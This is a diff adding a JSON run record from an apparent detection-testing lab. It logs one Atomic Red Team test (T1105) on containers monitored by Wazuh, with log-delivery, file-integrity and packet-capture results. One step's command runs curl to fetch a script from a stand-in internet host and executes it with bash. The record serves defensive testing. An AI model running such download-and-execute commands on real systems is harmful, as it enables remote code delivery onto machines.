@@ -1,0 +1,251 @@
+{
+  "range": "retained-packet",
+  "version": 1,
+  "run_id": "20261127T151119Z-7dd098",
+  "spec": {
+    "file": "retained-packet.yaml"
+  },
+  "environment": "GitHub-hosted runner",
+  "run_url": "https://github.com/Moneer-S/BlueFire-Nexus/actions/runs/46022496042",
+  "containers": {
+    "web": {
+      "name": "bluefire-lab-rp-web",
+      "addresses": {
+        "lab": "172.18.0.2"
+      }
+    },
+    "inet": {
+      "name": "bluefire-lab-rp-inet",
+      "addresses": {
+        "lab": "172.18.0.3"
+      }
+    },
+    "manager": {
+      "name": "bluefire-lab-rp-manager",
+      "addresses": {
+        "lab": "172.18.0.1"
+      }
+    }
+  },
+  "defense": {
+    "wazuh_version": "4.14.10",
+    "alert_level": 12,
+    "manager": "manager",
+    "agents": [
+      "web"
+    ],
+    "delivery": {
+      "web": [
+        {
+          "source": "/var/log/auth.log",
+          "lines": 4,
+          "delivered": 4,
+          "missing": 0
+        },
+        {
+          "source": "/var/log/snoopy.log",
+          "lines": 46,
+          "delivered": 46,
+          "missing": 0
+        },
+        {
+          "source": "/var/log/dpkg.log",
+          "lines": 0,
+          "delivered": 0,
+          "missing": 0
+        }
+      ]
+    },
+    "delivery_gap": false,
+    "delivery_findings": [],
+    "drops": {
+      "manager: wazuh-analysisd.state": {
+        "events_dropped": "0"
+      },
+      "manager: wazuh-remoted.state": {
+        "discarded_count": "0"
+      },
+      "web: wazuh-agentd.state": {},
+      "web: wazuh-logcollector.state": {
+        "counted until": "not written yet"
+      },
+      "web: ossec.log": {
+        "agent buffer full": "0",
+        "real-time inotify queue full": "0"
+      }
+    },
+    "wazuh_counted_drops": false,
+    "fim_marks": [
+      {
+        "host": "web",
+        "folder": "/tmp",
+        "event": "added",
+        "made": true,
+        "archived": true
+      },
+      {
+        "host": "web",
+        "folder": "/tmp",
+        "event": "modified",
+        "made": true,
+        "archived": true
+      }
+    ]
+  },
+  "atomic_red_team": {
+    "commit": "a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6"
+  },
+  "activity": null,
+  "weaknesses": [],
+  "path": {
+    "planned": [
+      "s01"
+    ],
+    "steps": [
+      {
+        "id": "s01",
+        "host": "web",
+        "to": [
+          "inet"
+        ],
+        "account": "root",
+        "workdir": "/tmp",
+        "technique": "T1105",
+        "guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
+        "name": "Linux Download File and Run",
+        "plain": "On web, downloads a small script from the stand-in internet and runs it.",
+        "args": {
+          "remote_url": "http://inet/atomics/T1105/src/atomic.sh",
+          "payload_name": "atomic.sh"
+        },
+        "timeout": 120,
+        "cleanup": "after_check",
+        "expect": [
+          554
+        ],
+        "argv": [
+          "sh",
+          "-c",
+          "curl -sO http://inet/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh"
+        ],
+        "handled": "2026-11-27T15:12:02.496797Z",
+        "happened": "took effect",
+        "why": "the effect check passed",
+        "prereq_passed": true,
+        "exit_code": 0,
+        "stopped_by_timeout": false,
+        "started_ns": 1795792322506520054,
+        "ended_ns": 1795792322536033386,
+        "started": "2026-11-27T15:12:02.506520Z",
+        "ended": "2026-11-27T15:12:02.536033Z",
+        "seconds": 0.03,
+        "time_source": "daemon",
+        "daemon_exit_code": 0,
+        "check": {
+          "result": "pass",
+          "parts": [
+            {
+              "kind": "output_contains",
+              "text": "Hello From Atomic Red Team",
+              "result": "pass"
+            },
+            {
+              "kind": "run",
+              "host": "inet",
+              "command": "grep -q '^172.18.0.2 GET /atomics/T1105/src/atomic.sh 200' /var/log/inet/access.log",
+              "exit_code": 0,
+              "stdout": "",
+              "stderr": "",
+              "result": "pass"
+            }
+          ]
+        },
+        "cleanup_run": {
+          "exit_code": 0,
+          "timed_out": false,
+          "time_source": "daemon",
+          "started_ns": 1795792327749628339,
+          "ended_ns": 1795792327771819313,
+          "started": "2026-11-27T15:12:07.749628Z",
+          "ended": "2026-11-27T15:12:07.771819Z"
+        }
+      }
+    ],
+    "goal": null,
+    "stopped": null,
+    "notes": [
+      "Each test runs through docker exec as the step's account: its parent is the container runtime, not a login shell, and no step runs inside the session of an earlier one.",
+      "A step's start and end are the Docker daemon's times of its exec_start and exec_die events, when they are in order; otherwise the engine's, and the step's time_source says so.",
+      "blocked cannot occur: the range configures no active response.",
+      "An effect check that exits nonzero counts as no effect, also when it could not find the file it reads; only a check that could not be run at all makes a step inconclusive."
+    ]
+  },
+  "packet_capture": {
+    "program": "tcpdump",
+    "path": "/var/log/bluefire/packets",
+    "filter": "not (port 1514 or port 1515)",
+    "home_hosts": [
+      "web"
+    ],
+    "home_net": [
+      "172.18.0.2"
+    ],
+    "hosts": {
+      "web": {
+        "started": true,
+        "ready": [
+          {
+            "network": "lab",
+            "interface": "eth0",
+            "source": "172.18.0.2",
+            "destination": "172.18.0.3",
+            "destination host": "inet",
+            "port": 62001,
+            "token": "bluefire-packet-mark-20261127T151119Z-7dd098-web-lab",
+            "seen": true,
+            "seconds": 32.8
+          }
+        ],
+        "stopped": {
+          "at": "2026-11-27T15:12:10.763175Z",
+          "cleanly": true
+        },
+        "collected": {
+          "copied": true
+        },
+        "files": {
+          "eth0.pcap": {
+            "file": "raw/hosts/web/var/log/bluefire/packets/eth0.pcap",
+            "bytes": 10922,
+            "sha256": "70389b89b30b49db9010722420cb9abd23608f78856131c8d2a631eeab9188ec",
+            "packets": 92,
+            "captured packet bytes": 9426,
+            "wire packet bytes": 9426,
+            "whole packets": true,
+            "snap length": 262144,
+            "link type": 1,
+            "timestamp resolution": "microseconds",
+            "xz -9 bytes": 4728,
+            "tcpdump": {
+              "captured": 92,
+              "received by filter": 92,
+              "dropped by kernel": 0
+            }
+          }
+        }
+      }
+    },
+    "analysed": true,
+    "delivery_gap": false,
+    "delivery_findings": []
+  },
+  "result": "sealed",
+  "reason": null,
+  "exit_code": 0,
+  "teardown_complete": true,
+  "recording_clock": {
+    "started": "2026-11-27T15:11:21.316854Z",
+    "ended": "2026-11-27T15:12:11.316375Z",
+    "basis": "the first and last Docker event timeNano selected by the hosted workflow"
+  }
+}
